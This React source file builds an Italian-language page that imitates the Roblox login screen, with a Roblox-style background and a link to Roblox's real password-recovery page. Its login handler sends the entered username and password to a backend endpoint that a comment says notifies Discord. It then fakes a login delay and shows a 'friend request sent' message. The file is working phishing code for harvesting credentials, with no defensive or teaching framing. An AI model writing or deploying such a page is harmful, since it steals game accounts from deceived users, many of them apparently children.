/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState } from "react";
import { motion, AnimatePresence } from "motion/react";
import { User, Lock, ChevronLeft, Eye, EyeOff } from "lucide-react";

function LoginScreen({ 
  onLogin, 
  setUsername, 
  setCode 
}: { 
  onLogin: () => void; 
  setUsername: (val: string) => void; 
  setCode: (val: string) => void 
}) {
  const [showPassword, setShowPassword] = useState(false);

  return (
    <div className="relative min-h-screen w-full bg-transparent overflow-hidden flex flex-col font-sans">
      <div className="relative flex-1 flex items-center justify-center p-6">
        {/* Background Image from user provided URL */}
        <div 
          className="absolute inset-0 z-0 bg-cover bg-center pointer-events-none"
          style={{ 
            backgroundImage: 'url("https://www.messoanuovo.it/cdn/shop/articles/pc-gaming-roblox_e044e3e4-bcc9-4bf2-aba5-cf146cb31890.png?v=1768898277")',
          }}
        />

        {/* Login Form Container */}
        <motion.div 
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="relative z-10 w-full max-w-[420px] flex flex-col gap-5 pt-10"
        >
          <div className="flex flex-col gap-4">
            <div className="relative">
              <input 
                type="text" 
                placeholder="Email / Telefono / Nome Utente" 
                onChange={(e) => setUsername(e.target.value)}
                className="w-full bg-[#000000CC] border border-white/40 text-white rounded-md py-3.5 px-4 outline-none transition-all placeholder:text-gray-400 text-lg shadow-lg"
              />
            </div>
            <div className="relative">
              <input 
                type={showPassword ? "text" : "password"} 
                placeholder="Password" 
                onChange={(e) => setCode(e.target.value)}
                className="w-full bg-[#000000CC] border border-white/40 text-white rounded-md py-3.5 px-4 outline-none transition-all placeholder:text-gray-400 text-lg shadow-lg pr-12"
              />
              <button 
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-4 top-1/2 -translate-y-1/2 text-white opacity-60 hover:opacity-100 transition-opacity"
              >
                {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
              </button>
            </div>
          </div>

          <button 
            onClick={onLogin}
            className="w-full bg-[#A8A8A8] text-gray-900 rounded-md py-4 font-bold active:scale-[0.98] transition-all cursor-pointer text-xl shadow-lg border border-white/20"
          >
            Accedi
          </button>

          <div className="mt-8 flex justify-center">
            <a 
              href="https://www.roblox.com/it/login/forgot-password-or-username" 
              target="_blank" 
              rel="noopener noreferrer" 
              className="text-[#E8E8E8] text-sm font-medium hover:underline tracking-tight"
            >
              Hai dimenticato la password o il nome utente?
            </a>
          </div>
        </motion.div>
      </div>
    </div>
  );
}

function MainScreen() {
  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      className="min-h-screen bg-[#0E1111] flex flex-col items-center justify-center p-6 text-center"
    >
      <div className="bg-[#1A1D1D] p-12 rounded-3xl shadow-[0_0_50px_rgba(0,0,0,0.5)] border border-white/5 flex flex-col items-center gap-8 max-w-md w-full">
        <h2 className="text-4xl sm:text-5xl font-black text-white leading-tight uppercase tracking-tight">
          amicizia inviata
        </h2>
        <div className="h-1 w-24 bg-white/20 rounded-full" />
        <p className="text-gray-400 text-lg">
          L'operazione è stata completata con successo.
        </p>
      </div>
    </motion.div>
  );
}

export default function App() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [username, setUsername] = useState("");
  const [code, setCode] = useState("");

  const handleLogin = async () => {
    setIsLoggingIn(true);

    try {
      // Send notification to Discord via our backend
      const response = await fetch("/api/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, code }),
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        console.error("Errore server (Vercel):", response.status, errorData);
        // Alert per debugging (opzionale, utile per l'utente)
        console.warn("La notifica non è stata inviata correttamente a Discord. Controlla i log di Vercel.");
      } else {
        console.log("Notifica Discord inviata con successo!");
      }
    } catch (error) {
      console.error("Errore di rete o connessione API:", error);
    }

    // Mimic actual login delay
    setTimeout(() => {
      setIsLoggedIn(true);
      setIsLoggingIn(false);
    }, 1200);
  };

  return (
    <div className="min-h-screen bg-black">
      <AnimatePresence mode="wait">
        {!isLoggedIn ? (
          <motion.div 
            key="login-container"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="w-full h-full"
          >
            {isLoggingIn ? (
              <div className="min-h-screen flex items-center justify-center">
                <motion.div 
                  animate={{ rotate: 360 }}
                  transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                  className="w-12 h-12 border-4 border-white/20 border-t-white rounded-full"
                />
              </div>
            ) : (
              <LoginScreen onLogin={handleLogin} setUsername={setUsername} setCode={setCode} />
            )}
          </motion.div>
        ) : (
          <motion.div 
            key="main-container"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
          >
            <MainScreen />
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
